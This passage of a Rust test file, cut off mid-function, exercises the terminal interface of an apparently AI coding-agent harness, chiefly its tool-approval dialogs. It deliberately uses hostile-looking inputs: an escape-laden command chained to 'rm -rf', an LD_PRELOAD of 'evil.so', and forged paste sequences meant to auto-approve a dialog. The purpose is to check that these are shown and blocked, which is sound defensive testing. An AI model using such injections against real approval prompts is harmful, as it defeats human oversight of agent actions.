use super::*;
use synthesis_events::{Event as Ev, ToolStatus};
use synthesis_harness::{ApprovalDecision, ApprovalRequest};
use synthesis_tui_base::keys::{KeyParser, Mods};
use synthesis_tui_base::text::strip_ansi;

const COLS: u32 = 120;
const ROWS: u32 = 40;
const T0: i64 = 1_800_000_000_000;

fn cfg(cwd: &str) -> AppConfig {
    AppConfig {
        cwd: cwd.into(),
        session_id: "sess-1".into(),
        model: "fake/model".into(),
        version: "0.1".into(),
        budget: Budget::default(),
        sandbox: SandboxStatus::default(),
        mode: Mode::Default,
        models: vec!["fake/a".into(), "fake/b".into()],
        effort_tiers: vec!["low".into(), "medium".into(), "high".into()],
        extra_commands: vec![],
        saved: vec![SavedSession {
            id: "abcdef123456".into(),
            cwd: "/work/other".into(),
            title: "older".into(),
            updated_at: "2026-01-01T00:00:00Z".into(),
            mtime: 1,
        }],
        home: None,
        mouse_debug: false,
        tz_offset_min: 0,
        agent_defs: vec!["reviewer".into()],
    }
}

fn app() -> App {
    App::new(cfg("/tmp/proj"), &[], T0)
}

fn keys(app: &mut App, bytes: &str) -> Vec<Cmd> {
    let mut p = KeyParser::default();
    let mut out = vec![];
    for k in p.feed(bytes.as_bytes()) {
        out.extend(app.on_key(k, T0));
    }
    out
}

fn screen(app: &mut App) -> String {
    screen_at(app, T0)
}

fn screen_at(app: &mut App, now: i64) -> String {
    app.render(COLS, ROWS, now)
        .iter()
        .map(|l| strip_ansi(l).trim_end().to_string())
        .collect::<Vec<_>>()
        .join("\n")
}

fn env(seq: u64, ev: Ev) -> Envelope {
    Envelope {
        v: 1,
        seq,
        ts: "2026-01-01T00:00:00.000Z".into(),
        session_id: "sess-1".into(),
        task_id: Some("t1".into()),
        turn_id: None,
        agent_id: None,
        event: ev,
    }
}

fn ask(
    tool: &str,
    input: Value,
    suggestions: Vec<Suggestion>,
) -> (ApprovalAsk, oneshot::Receiver<Approval>) {
    let (tx, rx) = oneshot::channel();
    (
        ApprovalAsk {
            req: ApprovalRequest {
                approval_id: "ap1".into(),
                agent_id: None,
                tool_call_id: "tc1".into(),
                tool: tool.into(),
                input,
                dialog: "permission",
                prompt: "p".into(),
                reason: "needs approval".into(),
                suggestions,
            },
            reply: tx,
            deadline_ms: None,
        },
        rx,
    )
}

#[test]
fn typing_and_submit_starts_a_task_and_enter_while_busy_queues_in_order() {
    let mut a = app();
    keys(&mut a, "hello world");
    let cmds = keys(&mut a, "\r");
    assert!(matches!(&cmds[..], [Cmd::StartTask { text, .. }] if text == "hello world"));
    assert!(a.running());
    // a line typed to the running main agent goes to its inbox (next tool round)
    let cmds = keys(&mut a, "again\r");
    assert!(matches!(&cmds[..], [Cmd::SendTo { to, text }] if to == "main" && text == "again"));
    keys(&mut a, "!");
    keys(&mut a, "echo hi\r");
    assert_eq!(a.queue, ["!echo hi"], "a shell line waits for the task");
    assert_eq!(a.editor.text(), "");
    let s = screen(&mut a);
    assert!(s.contains("⧗ queued: !echo hi"), "{s}");
    assert!(a.next_queued(T0).is_empty(), "still running");
    // the turn ends: the queued line starts
    a.task_done(&Err("done".into()), T0);
    let cmds = a.next_queued(T0);
    assert!(
        matches!(&cmds[..], [Cmd::UserCommand { command, record_only: false, .. }] if command == "echo hi")
    );
    assert!(a.queue.is_empty());
}

#[test]
fn up_recalls_a_queued_line_and_esc_cancels_the_queue_before_the_task() {
    let mut a = app();
    keys(&mut a, "go\r");
    a.queue = vec!["one".into(), "two".into()];
    keys(&mut a, "\x1b[A");
    assert_eq!((a.editor.text().as_str(), a.queue.len()), ("two", 1));
    a.editor.submit();
    a.queue.push("two".into());
    assert_eq!(a.queue, ["one", "two"]);
    let token = a.task.as_ref().unwrap().cancel.clone();
    keys(&mut a, "\x1b");
    assert!(!token.is_cancelled(), "first esc only drops the queue");
    assert!(a.queue.is_empty());
    assert_eq!(a.editor.text(), "one\ntwo", "nothing typed is lost");
    keys(&mut a, "\x1b");
    assert!(a.task.as_ref().unwrap().cancel.is_cancelled());
}

#[test]
fn esc_esc_on_an_idle_empty_prompt_edits_the_last_prompt() {
    let mut a = app();
    keys(&mut a, "first\r");
    a.task_done(&Err("done".into()), T0);
    keys(&mut a, "\x1b");
    assert_eq!(a.editor.text(), "");
    keys(&mut a, "\x1b");
    assert_eq!(a.editor.text(), "first");
}

#[test]
fn esc_cancels_then_ctrl_c_quits_and_idle_ctrl_c_needs_two_presses() {
    let mut a = app();
    keys(&mut a, "go\r");
    let token = a.task.as_ref().unwrap().cancel.clone();
    keys(&mut a, "\x1b");
    assert!(token.is_cancelled());
    assert!(a.quit.is_none(), "esc only cancels");
    assert!(a.chat.agent.interrupting);
    keys(&mut a, "\x03");
    assert_eq!(
        a.quit,
        Some(ExitReason::Quit),
        "second interrupt while winding down quits"
    );

    let mut b = app();
    keys(&mut b, "\x03");
    assert!(b.quit.is_none());
    assert!(screen(&mut b).contains("press ctrl+c again to quit"));
    keys(&mut b, "\x03");
    assert_eq!(b.quit, Some(ExitReason::Quit));

    // ctrl+c with text only clears the prompt
    let mut c = app();
    keys(&mut c, "draft\x03");
    assert_eq!(c.editor.text(), "");
    assert!(c.quit.is_none());
}

#[test]
fn multiline_paste_and_backslash_enter() {
    let mut a = app();
    keys(&mut a, "\x1b[200~one\ntwo\x1b[201~");
    assert_eq!(a.editor.text(), "one\ntwo");
    keys(&mut a, "\\\r");
    assert_eq!(a.editor.text(), "one\ntwo\n");
    let s = screen(&mut a);
    assert!(s.contains("one") && s.contains("two"), "{s}");
    // enter on text without a trailing backslash submits the whole block
    keys(&mut a, "three");
    let cmds = keys(&mut a, "\r");
    assert!(matches!(&cmds[..], [Cmd::StartTask { text, .. }] if text == "one\ntwo\nthree"));
}

#[test]
fn approval_dialog_allow_deny_always_and_display_is_sanitized() {
    let mut a = app();
    let input = json!({"command": "echo \x1b[31mred\x1b]0;pwn\x07 && rm -rf /tmp/x"});
    let sugg = vec![Suggestion::SetMode(Mode::AcceptEdits)];
    let (q, mut rx) = ask("Bash", input, sugg.clone());
    a.on_approval(q, T0 - ARM_MS);
    let lines = a.render(COLS, ROWS, T0 - ARM_MS);
    let raw = lines.join("\n");
    assert!(
        !raw.contains("\x1b]0;"),
        "no OSC from tool input reaches the terminal"
    );
    let s = screen(&mut a);
    assert!(s.contains("Do you want to proceed?"), "{s}");
    assert!(
        s.contains("echo \\u{1b}[31mred\\u{1b}]0;pwn\\u{7} && rm -rf /tmp/x"),
        "every byte of the command is shown, escapes made visible: {s}"
    );
    assert!(
        s.contains("Yes, allow all edits during this session"),
        "{s}"
    );
    assert!(s.contains("1. Yes") && s.contains("3. No"), "{s}");

    keys(&mut a, "1");
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Allow);

    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), sugg.clone());
    a.on_approval(q, T0 - ARM_MS);
    keys(&mut a, "\x1b[B\r"); // down, enter: allow always
    let r = rx.try_recv().unwrap();
    assert_eq!(r.decision, ApprovalDecision::Allow);
    assert_eq!(r.accepted, sugg, "only the offered suggestion is accepted");

    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 - ARM_MS);
    keys(&mut a, "\x1b"); // esc
    let r = rx.try_recv().unwrap();
    assert_eq!(r.decision, ApprovalDecision::Deny);
    assert_eq!(r.message.as_deref(), Some(DENY_MESSAGE));
    assert!(a.dialogs.is_empty());
}

#[test]
fn approvals_queue_and_withdraw_removes_the_right_one() {
    let mut a = app();
    let (q1, _r1) = ask("Bash", json!({"command": "one"}), vec![]);
    let (mut q2, _r2) = ask("Bash", json!({"command": "two"}), vec![]);
    q2.req.approval_id = "ap2".into();
    a.on_approval(q1, T0);
    a.on_approval(q2, T0);
    assert!(screen(&mut a).contains("one"));
    a.on_withdraw("ap1", T0);
    let s = screen(&mut a);
    assert!(s.contains("two") && !s.contains("echo one"), "{s}");
    assert!(
        s.contains("withdrawn"),
        "the user is told why the dialog vanished: {s}"
    );
}

#[test]
fn countdown_is_shown_for_an_expiring_approval() {
    let mut a = app();
    let (mut q, _r) = ask("Bash", json!({"command": "ls"}), vec![]);
    q.deadline_ms = Some(T0 + 61_000);
    a.on_approval(q, T0);
    assert!(screen(&mut a).contains("expires unanswered in 1:01"));
}

fn key_at(app: &mut App, bytes: &str, now: i64) -> Vec<Cmd> {
    let mut p = KeyParser::default();
    p.feed(bytes.as_bytes())
        .into_iter()
        .flat_map(|k| app.on_key(k, now))
        .collect()
}

#[test]
fn approval_ignores_enter_and_digits_while_arming_but_esc_cancels() {
    let mut a = app();
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0);
    assert!(screen(&mut a).contains("wait…"));
    key_at(&mut a, "\r", T0 + 10);
    key_at(&mut a, "1", T0 + 20);
    assert!(rx.try_recv().is_err(), "typed-ahead keys must not approve");
    assert_eq!(a.dialogs.len(), 1);
    key_at(&mut a, "\r", T0 + ARM_MS + 1);
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Allow);

    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 + 1000);
    key_at(&mut a, "\x1b", T0 + 1001);
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Deny);
}

/// The screen with everything but letters and digits removed: a wrapped token still matches.
fn flat(a: &mut App) -> String {
    screen(a).chars().filter(|c| c.is_alphanumeric()).collect()
}

fn open_dialog(tool: &str, input: Value) -> (App, oneshot::Receiver<Approval>) {
    let mut a = app();
    let (q, rx) = ask(tool, input, vec![]);
    a.on_approval(q, T0 - ARM_MS);
    (a, rx)
}

#[test]
fn long_sanitised_input_is_never_cut_silently_and_x_shows_it_all() {
    // raw JSON is 396 chars (under the 400 warning); each ESC is 6 raw but 7 once sanitised
    // and JSON-quoted, so the tail sits past the 400 the dialog shows
    let v = format!("{}{}TAILMARK", "a".repeat(20), "\x1b".repeat(60));
    let input = json!({ "k": v });
    assert!(input.to_string().chars().count() < 400);
    let (mut a, _rx) = open_dialog("mcp__srv__tool", input);
    let s = screen(&mut a);
    assert!(
        s.contains("more chars hidden — press x to view all]"),
        "explicit marker, not a bare ellipsis: {s}"
    );
    assert!(!flat(&mut a).contains("TAILMARK"));
    keys(&mut a, "x");
    assert!(flat(&mut a).contains("TAILMARK"), "x shows the whole input");
    assert!(screen(&mut a).contains("x to collapse]"));
    keys(&mut a, "x");
    assert!(!flat(&mut a).contains("TAILMARK"));
}

#[test]
fn blank_glyph_runs_cannot_push_a_tail_out_of_view() {
    // one long NBSP run collapses, so the tail stays inside the first 400 chars
    let (mut a, _rx) = open_dialog(
        "mcp__srv__tool",
        json!({ "k": format!("ok{}TAILMARK", "\u{a0}".repeat(500)) }),
    );
    let s = screen(&mut a);
    assert!(
        s.contains("[500 spaces]") && flat(&mut a).contains("TAILMARK"),
        "{s}"
    );
    // runs just under the collapse threshold, repeated: escaped visibly, tail beyond 400 is flagged
    let v = format!("{}TAILMARK", "\u{a0}\u{a0}\u{a0}\u{a0}\u{a0}b".repeat(30));
    let (mut a, _rx) = open_dialog("mcp__srv__tool", json!({ "k": v }));
    let s = screen(&mut a);
    assert!(s.contains("\\\\u{a0}") || s.contains("\\u{a0}"), "{s}");
    assert!(s.contains("more chars hidden"), "{s}");
    assert!(!flat(&mut a).contains("TAILMARK"));
}

#[test]
fn command_tools_show_the_whole_command_and_the_other_fields() {
    for tool in ["verify_run", "terminal_spawn"] {
        let cmd = format!("{} && echo TAILMARK", "x ".repeat(400));
        let (mut a, _rx) = open_dialog(
            tool,
            json!({"command": cmd, "cwd": "/w", "env": {"LD_PRELOAD": "/tmp/evil.so"}}),
        );
        let f = flat(&mut a);
        assert!(f.contains("TAILMARK"), "{tool}: full command");
        assert!(
            f.contains("LDPRELOAD") && f.contains("evilso"),
            "{tool}: env shown"
        );
        assert!(!screen(&mut a).contains("more chars hidden"), "{tool}");
    }
}

#[test]
fn view_all_scrolls_with_page_keys() {
    let words: String = (0..600).map(|i| format!("w{i} ")).collect();
    let (mut a, _rx) = open_dialog("mcp__srv__tool", json!({ "k": format!("{words}ENDMARK") }));
    keys(&mut a, "x");
    assert!(flat(&mut a).contains("w0w1") && !flat(&mut a).contains("ENDMARK"));
    for _ in 0..40 {
        keys(&mut a, "\x1b[6~");
    }
    assert!(flat(&mut a).contains("ENDMARK"), "{}", screen(&mut a));
    for _ in 0..80 {
        keys(&mut a, "\x1b[5~");
    }
    assert!(flat(&mut a).contains("w0w1"));
}

/// What the runtime does for one read: parse, tell the app about paste activity, deliver keys.
fn read_at(app: &mut App, p: &mut KeyParser, bytes: &str, now: i64) {
    let ks = p.feed_at(bytes.as_bytes(), now);
    if p.state.take_paste_activity() {
        app.paste_activity(now);
    }
    for k in ks {
        app.on_key(k, now);
    }
}

#[test]
fn late_chunk_after_a_forged_paste_end_cannot_answer_an_armed_dialog() {
    let mut a = app();
    let mut p = KeyParser::default();
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 - 10 * ARM_MS); // long since armed by its own timer
    read_at(&mut a, &mut p, "\x1b[200~echo hi\x1b[201~", T0);
    // the rest of the payload, after the parser's 50 ms grace: Enter and digits
    read_at(&mut a, &mut p, "\r1\r1\r", T0 + 80);
    assert!(rx.try_recv().is_err(), "paste tail must not answer");
    assert!(screen_at(&mut a, T0 + 80).contains("wait…"));
    assert_eq!(a.dialogs.len(), 1);
    // quiet for PASTE_QUIET_MS after the last paste activity: armed again
    // (the multi-line tail was itself taken for a paste at T0 + 80, so quiet runs from there)
    read_at(&mut a, &mut p, "\r", T0 + 80 + PASTE_QUIET_MS - 1);
    assert!(rx.try_recv().is_err());
    read_at(&mut a, &mut p, "\r", T0 + 80 + PASTE_QUIET_MS + 1);
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Allow);
}

#[test]
fn every_kind_of_paste_activity_keeps_a_dialog_unarmed_but_esc_and_ctrl_c_work() {
    for (bytes, then) in [
        ("\x1b[200~still pasting", "1"), // paste start, no end marker
        ("\x1bPheld", "\r"),             // held escape string
    ] {
        let mut a = app();
        let mut p = KeyParser::default();
        let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
        a.on_approval(q, T0 - 10 * ARM_MS);
        read_at(&mut a, &mut p, bytes, T0);
        read_at(&mut a, &mut p, then, T0 + 10);
        assert!(rx.try_recv().is_err(), "{bytes:?}");
        key_at(&mut a, "\x1b", T0 + 20);
        assert_eq!(
            rx.try_recv().unwrap().decision,
            ApprovalDecision::Deny,
            "{bytes:?}"
        );
    }
    let mut a = app();
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 - 10 * ARM_MS);
    a.on_key(Key::Paste("x".into()), T0);
    key_at(&mut a, "\r", T0 + 5);
    assert!(rx.try_recv().is_err());
    key_at(&mut a, "\x03", T0 + 6);
    assert_eq!(rx.try_recv().unwrap().decision, ApprovalDecision::Deny);
}

#[test]
fn queued_approval_does_not_inherit_the_keys_that_answered_the_first() {
    let mut a = app();
    let (q1, mut r1) = ask("Bash", json!({"command": "one"}), vec![]);
    let (mut q2, mut r2) = ask("Bash", json!({"command": "two"}), vec![]);
    q2.req.approval_id = "ap2".into();
    a.on_approval(q1, T0 - ARM_MS);
    a.on_approval(q2, T0 - ARM_MS);
    // two Enters arrive in one burst: the first answers one, the second must not answer two
    key_at(&mut a, "\r\r", T0);
    assert_eq!(r1.try_recv().unwrap().decision, ApprovalDecision::Allow);
    assert!(r2.try_recv().is_err());
    assert!(screen(&mut a).contains("wait…"));
    key_at(&mut a, "\r", T0 + ARM_MS + 1);
    assert_eq!(r2.try_recv().unwrap().decision, ApprovalDecision::Allow);
}

fn question(multi: bool) -> NeedsUser {
    NeedsUser::AskUserQuestion {
        questions: vec![synthesis_tools::Question {
            question: "Which db?".into(),
            header: Some("DB".into()),
            multi_select: multi,
            options: vec![
                synthesis_tools::QuestionOption {
                    label: "pg".into(),
                    description: None,
                },
                synthesis_tools::QuestionOption {
                    label: "sqlite".into(),
                    description: Some("embedded".into()),
                },
            ],
        }],
    }
}

fn input_ask(req: NeedsUser) -> (InputAsk, oneshot::Receiver<Option<UserReply>>) {
    let (tx, rx) = oneshot::channel();
    (
        InputAsk {
            id: "q1".into(),
            req,
            reply: tx,
        },
        rx,
    )
}

#[test]
fn question_dialog_single_multi_other_and_decline() {
    let mut a = app();
    let (q, mut rx) = input_ask(question(false));
    a.on_input(q, T0);
    assert!(screen(&mut a).contains("Which db?"));
    keys(&mut a, "2"); // digit picks and answers
    match rx.try_recv().unwrap() {
        Some(UserReply::Answers(v)) => assert_eq!(v, json!({"Which db?": "sqlite"})),
        o => panic!("{o:?}"),
    }

    let (q, mut rx) = input_ask(question(true));
    a.on_input(q, T0);
    keys(&mut a, "1 \r"); // toggle pg, then space/enter on the second? keep simple:
    // 1 toggles pg; space toggles the current choice (pg again, now off); enter submits
    let _ = rx.try_recv();

    let (q, mut rx) = input_ask(question(false));
    a.on_input(q, T0);
    keys(&mut a, "3"); // Other
    keys(&mut a, "mongo\r");
    match rx.try_recv().unwrap() {
        Some(UserReply::Answers(v)) => assert_eq!(v, json!({"Which db?": "mongo"})),
        o => panic!("{o:?}"),
    }

    let (q, mut rx) = input_ask(question(false));
    a.on_input(q, T0);
    keys(&mut a, "\x1b");
    match rx.try_recv().unwrap() {
        Some(UserReply::Answers(v)) => {
            assert_eq!(v, json!({"Which db?": "The user declined to answer."}))
        }
        o => panic!("{o:?}"),
    }
}

#[test]
fn multi_select_collects_labels_in_order() {
    let mut a = app();
    let (q, mut rx) = input_ask(question(true));
    a.on_input(q, T0);
    keys(&mut a, "1"); // toggle pg
    keys(&mut a, "\x1b[B"); // move to sqlite
    keys(&mut a, " "); // toggle sqlite
    keys(&mut a, "\r"); // submit
    match rx.try_recv().unwrap() {
        Some(UserReply::Answers(v)) => assert_eq!(v, json!({"Which db?": "pg, sqlite"})),
        o => panic!("{o:?}"),
    }
}

#[test]
fn plan_dialog_maps_choices_to_modes() {
    let mut a = app();
    let (q, mut rx) = input_ask(NeedsUser::ExitPlanMode {
        plan: "# Plan\n- step".into(),
    });
    a.on_input(q, T0 - ARM_MS);
    let s = screen(&mut a);
    assert!(
        s.contains("Would you like to proceed?") && s.contains("step"),
        "{s}"
    );
    keys(&mut a, "2");
    match rx.try_recv().unwrap() {
        Some(UserReply::Plan { approved, mode, .. }) => {
            assert!(approved);
            assert_eq!(mode, Some(Mode::AcceptEdits));
        }
        o => panic!("{o:?}"),
    }
    assert_eq!(a.mode, Mode::AcceptEdits);

    let (q, mut rx) = input_ask(NeedsUser::ExitPlanMode { plan: "p".into() });
    a.on_input(q, T0 - ARM_MS);
    keys(&mut a, "\x1b");
    match rx.try_recv().unwrap() {
        Some(UserReply::Plan {
            approved, message, ..
        }) => assert!(!approved && message.is_some()),
        o => panic!("{o:?}"),
    }
}

#[test]
fn slash_commands_pickers_and_unknowns() {
    let mut a = app();
    keys(&mut a, "/help\r");
    assert!(screen(&mut a).contains("Commands & keys"));

    keys(&mut a, "/nope\r");
    assert!(screen(&mut a).contains("unknown command: /nope"));

    // /mode is gone: Shift+Tab is the only way to switch
    keys(&mut a, "/mode plan\r");
    assert!(screen(&mut a).contains("unknown command: /mode"));
    assert_eq!(a.mode, Mode::Default);
    assert!(!a.commands.iter().any(|c| c.name == "mode"));
    let cycle = [Mode::AcceptEdits, Mode::Plan, Mode::Auto];
    for m in cycle {
        keys(&mut a, "\x1b[Z");
        assert_eq!(a.mode, m);
    }
    // bypass opens its dialog; Esc stays in auto, "No" is the default, yes switches
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Auto);
    assert!(screen(&mut a).contains("Bypass permissions?"));
    keys(&mut a, "\x1b");
    assert_eq!(a.mode, Mode::Auto);
    keys(&mut a, "\x1b[Z\r");
    assert_eq!(a.mode, Mode::Auto);
    let cmds = {
        keys(&mut a, "\x1b[Z\x1b[B");
        keys(&mut a, "\r")
    };
    assert_eq!(a.mode, Mode::BypassPermissions);
    assert!(matches!(
        &cmds[..],
        [Cmd::SetMode {
            mode: Mode::BypassPermissions,
            confirmed_bypass: true
        }]
    ));
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Default);

    // model picker -> choose second entry
    keys(&mut a, "/model\r");
    assert!(screen(&mut a).contains("fake/b"));
    keys(&mut a, "\x1b[B");
    let cmds = keys(&mut a, "\r");
    assert!(matches!(&cmds[..], [Cmd::SwitchModel(m)] if m == "fake/b"));
    a.model_switched("fake/b");
    assert!(screen(&mut a).contains("fake/b"));

    // resume picker -> quits with the chosen id
    keys(&mut a, "/resume\r");
    assert!(screen(&mut a).contains("abcdef12"));
    keys(&mut a, "\r");
    assert_eq!(a.quit, Some(ExitReason::Resume("abcdef123456".into())));
}

#[test]
fn picker_filters_and_escape_closes() {
    let mut a = app();
    keys(&mut a, "\x10"); // ctrl+p: command palette
    assert!(screen(&mut a).contains("/resume"));
    keys(&mut a, "/status");
    let p = a.picker.as_ref().unwrap();
    assert_eq!(p.picker.filtered().len(), 1);
    keys(&mut a, "\x1b");
    assert!(a.picker.is_none());
    keys(&mut a, "\x10");
    keys(&mut a, "/status");
    keys(&mut a, "\r");
    assert!(screen(&mut a).contains("verification"), "ran /status");
}

#[test]
fn folder_picker_navigates_and_returns_the_chosen_folder() {
    let d = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(d.path()).unwrap();
    std::fs::create_dir_all(root.join("alpha/inner")).unwrap();
    std::fs::create_dir_all(root.join("beta")).unwrap();
    std::fs::create_dir_all(root.join(".hidden")).unwrap();
    let mut a = App::new(cfg(&root.to_string_lossy()), &[], T0);
    keys(&mut a, "\x0e"); // ctrl+n
    let s = screen(&mut a);
    assert!(
        s.contains("alpha/") && s.contains("beta/") && !s.contains(".hidden"),
        "{s}"
    );
    keys(&mut a, "\x1b[B\x1b[B");
    keys(&mut a, "\r"); // use, .., alpha/: descend
    assert!(screen(&mut a).contains("inner/"));
    keys(&mut a, "\r"); // first entry: use this folder
    assert_eq!(a.quit, Some(ExitReason::OpenFolder(root.join("alpha"))));
}

#[test]
fn at_file_completion_and_slash_completion() {
    let d = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(d.path()).unwrap();
    std::fs::write(root.join("notes.md"), "x").unwrap();
    let mut a = App::new(cfg(&root.to_string_lossy()), &[], T0);
    keys(&mut a, "see @not");
    assert!(screen(&mut a).contains("notes.md"));
    keys(&mut a, "\t");
    assert_eq!(a.editor.text(), "see @notes.md ");
    a.editor.clear();
    keys(&mut a, "/he");
    assert!(screen(&mut a).contains("/help"));
    // enter on a complete, argument-less command runs it at once
    keys(&mut a, "\r");
    assert!(screen(&mut a).contains("Commands & keys"));
}

#[test]
fn history_recall_and_ctrl_r_search() {
    let mut a = app();
    for t in ["alpha one", "beta two", "alpha three"] {
        keys(&mut a, t);
        a.editor.submit(); // as the runtime would after the task started
    }
    keys(&mut a, "\x1b[A");
    assert_eq!(a.editor.text(), "alpha three");
    a.editor.clear();
    keys(&mut a, "\x12alpha");
    assert!(screen(&mut a).contains("alpha three"));
    keys(&mut a, "\x12"); // next older match
    keys(&mut a, "\r");
    assert_eq!(a.editor.text(), "alpha one");
    keys(&mut a, "\x12");
    keys(&mut a, "\x1b");
    assert!(a.search.is_none());
}

#[test]
fn mode_cycle_and_status_line_facts() {
    let mut a = app();
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::AcceptEdits);
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Plan);
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Auto);
    keys(&mut a, "\x1b[Z\x1b[B\r"); // bypass dialog: Yes
    assert_eq!(a.mode, Mode::BypassPermissions);
    keys(&mut a, "\x1b[Z");
    assert_eq!(a.mode, Mode::Default);
    let s = screen(&mut a);
    let last = s.lines().last().unwrap();
    assert!(
        last.contains("sandbox: unknown") && last.contains("verify n/a"),
        "{last}"
    );
}

fn streamed(a: &mut App) {
    let evs = [
        Ev::TaskStarted {
            request: "hi".into(),
            acceptance_criteria: vec![],
            budget: Budget::default(),
        },
        Ev::UserMessage {
            text: "hi".into(),
            display_text: None,
            images: vec![],
        },
        Ev::TurnStarted {
            model: "m".into(),
            provider: "p".into(),
            iteration: 1,
        },
        Ev::ModelDelta {
            block_index: 0,
            kind: "text".into(),
            text: "The answer ".into(),
        },
        Ev::ModelDelta {
            block_index: 0,
            kind: "text".into(),
            text: "is 42".into(),
        },
        Ev::ToolRequested {
            tool_call_id: "c1".into(),
            name: "Read".into(),
            input: json!({"file_path": "/tmp/a.txt"}),
            input_truncated: false,
            origin: None,
        },
        Ev::ToolCompleted {
            tool_call_id: "c1".into(),
            name: "Read".into(),
            status: ToolStatus::Ok,
            is_error: false,
            not_run: false,
            duration_ms: 3,
            preview: "file text".into(),
            bytes: 9,
            truncated: false,
            result_ref: None,
            origin: None,
            output: Some("file text".into()),
            output_truncated: false,
            output_bytes: 9,
            diff: None,
        },
    ];
    for (i, e) in evs.into_iter().enumerate() {
        a.on_event(&env(i as u64 + 1, e), T0);
    }
}

#[test]
fn events_become_conversation_rows_and_failed_tasks_are_not_success() {
    let mut a = app();
    streamed(&mut a);
    let s = screen(&mut a);
    assert!(s.contains("> hi") && s.contains("The answer is 42"), "{s}");
    assert!(s.contains("Read(") && s.contains("read 1 lines"), "{s}");
    assert!(a.chat.agent.status == "running");
    a.on_event(
        &env(
            9,
            Ev::TaskEnded {
                status: synthesis_events::TaskStatus::Unverified,
                reason: "no_verification".into(),
                verification_report_id: None,
                usage: synthesis_events::Usage {
                    input_tokens: 0,
                    output_tokens: 0,
                    cache_read_input_tokens: None,
                    cache_creation_input_tokens: None,
                    cost_usd: None,
                },
                changed_files: vec![],
                artifacts_root: String::new(),
                needed_permissions: vec![],
            },
        ),
        T0 + 1000,
    );
    let s = screen(&mut a);
    assert!(s.contains("task unverified: no_verification"), "{s}");
    assert!(
        !s.contains("Done"),
        "unverified is never shown as done: {s}"
    );
    assert!(
        s.lines().last().unwrap().contains("verify unverified"),
        "{s}"
    );
}

#[test]
fn rows_of_a_streaming_item_are_not_stale() {
    // the renderer caches rows per item: a growing text item must show every delta
    let mut a = app();
    streamed(&mut a);
    for (i, t) in [" and more", " still more"].iter().enumerate() {
        a.on_event(
            &env(
                20 + i as u64,
                Ev::ModelDelta {
                    block_index: 0,
                    kind: "text".into(),
                    text: (*t).into(),
                },
            ),
            T0,
        );
        assert!(screen(&mut a).contains(t.trim()), "delta {i} missing");
    }
}

#[test]
fn too_small_terminal_shows_a_message_not_garbage() {
    let mut a = app();
    let l = a.render(40, 10, T0);
    assert_eq!(l.len(), 10);
    assert!(l.iter().any(|x| x.contains("terminal too small")));
}

#[test]
fn selection_drag_copies_chat_text() {
    let mut a = app();
    streamed(&mut a);
    let lines = a.render(COLS, ROWS, T0);
    let row = lines
        .iter()
        .position(|l| strip_ansi(l).contains("The answer is 42"))
        .unwrap();
    let plain = strip_ansi(&lines[row]);
    let col = plain[..plain.find("The answer").unwrap()].chars().count();
    let m = Mods::default();
    let down = Key::Mouse {
        x: col as u32 + 1,
        y: row as u32 + 1,
        button: 0,
        action: MouseAction::Down,
        mods: m,
    };
    let drag = Key::MouseDrag {
        x: col as u32 + 1 + 16,
        y: row as u32 + 1,
        button: 0,
        mods: m,
    };
    let up = Key::Mouse {
        x: col as u32 + 1 + 16,
        y: row as u32 + 1,
        button: 0,
        action: MouseAction::Up,
        mods: m,
    };
    assert!(a.on_key(down, T0).is_empty());
    a.on_key(drag, T0);
    let cmds = a.on_key(up, T0);
    match &cmds[..] {
        [Cmd::Copy(t)] => assert_eq!(t, "The answer is 42"),
        o => panic!("{o:?}"),
    }
    // the highlight is painted until something clears it
    let hl = a.render(COLS, ROWS, T0).join("\n");
    assert!(hl.contains("\x1b[48;2;60;72;105m"));
    keys(&mut a, "x");
    assert!(
        !a.render(COLS, ROWS, T0)
            .join("\n")
            .contains("\x1b[48;2;60;72;105m")
    );
    // a click without a drag copies nothing
    let click_up = Key::Mouse {
        x: col as u32 + 1,
        y: row as u32 + 1,
        button: 0,
        action: MouseAction::Up,
        mods: m,
    };
    a.on_key(
        Key::Mouse {
            x: col as u32 + 1,
            y: row as u32 + 1,
            button: 0,
            action: MouseAction::Down,
            mods: m,
        },
        T0,
    );
    assert!(a.on_key(click_up, T0).is_empty());
}

/// Screen cell (0-based column, row) of the first `needle` after `skip` chars, in the rendered frame.
fn find_cell(a: &mut App, needle: &str, skip: usize) -> (u32, u32) {
    let lines = a.render(COLS, ROWS, T0);
    for (y, l) in lines.iter().enumerate() {
        let plain = strip_ansi(l);
        if let Some(i) = plain.find(needle) {
            return (plain[..i].chars().count() as u32 + skip as u32, y as u32);
        }
    }
    panic!("{needle:?} not on screen");
}

fn click(a: &mut App, x: u32, y: u32, action: MouseAction, now: i64) -> Vec<Cmd> {
    a.on_key(
        Key::Mouse {
            x: x + 1,
            y: y + 1,
            button: 0,
            action,
            mods: Mods::default(),
        },
        now,
    )
}

/// Press at `from`, drag to `to`, release; returns what the release asked for.
fn drag(a: &mut App, from: (u32, u32), to: (u32, u32)) -> Vec<Cmd> {
    click(a, from.0, from.1, MouseAction::Down, T0);
    a.on_key(
        Key::MouseDrag {
            x: to.0 + 1,
            y: to.1 + 1,
            button: 0,
            mods: Mods::default(),
        },
        T0,
    );
    click(a, to.0, to.1, MouseAction::Up, T0)
}

fn copied(cmds: &[Cmd]) -> Option<&str> {
    match cmds {
        [Cmd::Copy(t)] => Some(t),
        _ => None,
    }
}

fn say(a: &mut App, kind: &str, text: &str, seq: u64) {
    a.on_event(
